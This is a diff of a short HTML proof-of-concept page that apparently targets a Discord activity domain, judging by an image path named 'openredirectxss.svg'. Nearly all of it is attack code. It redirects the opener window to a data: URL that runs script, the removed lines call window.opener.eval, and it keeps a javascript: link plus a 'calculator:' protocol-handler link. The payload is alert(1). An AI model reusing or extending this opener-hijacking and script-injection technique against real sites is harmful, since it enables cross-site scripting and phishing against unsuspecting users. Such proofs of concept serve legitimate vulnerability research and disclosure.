@@ -3,31 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Display SVG and Execute Command</title>
-    <script>
-        function executeCommand(command) {
-            if (window.opener) {
-                // Encode the command to be used in a data URL
-                const encodedCommand = encodeURIComponent(`data:text/html,<script>${command}<\/script>`);
-                opener.location = encodedCommand;
+ <script>
+        // Ensure that the code runs after the page has fully loaded
+        window.onload = function() {
+            if (opener) {
+                // Encode the JavaScript code to be executed
+                const encodedCommand = encodeURIComponent('alert(1)');
+                opener.location = `data:text/html,<script>${encodedCommand}<\/script>`;
             } else {
                 console.error('No opener found');
-            }
-        }
-
-        window.onload = function() {
-            executeCommand('alert(1)');
-            // Ensure only one window.onload function is used
-            if (window.opener) {
-                window.opener.eval('alert(1)');
             }
         };
     </script>
 </head>
 <body>
-    <h1>SVG Display and Command Execution Example</h1>
-    <img src="/1229114867307511879.discordsays.com/openredirectxss.svg" alt="Description of SVG">
-    <a href="javascript:window.opener.location='alert(1)'">Click Me!</a>
+      <a href="javascript:window.opener.location='alert(1)'">Click Me!</a>
     <a href="calculator:">Click Math!</a>
 </body>
 </html>
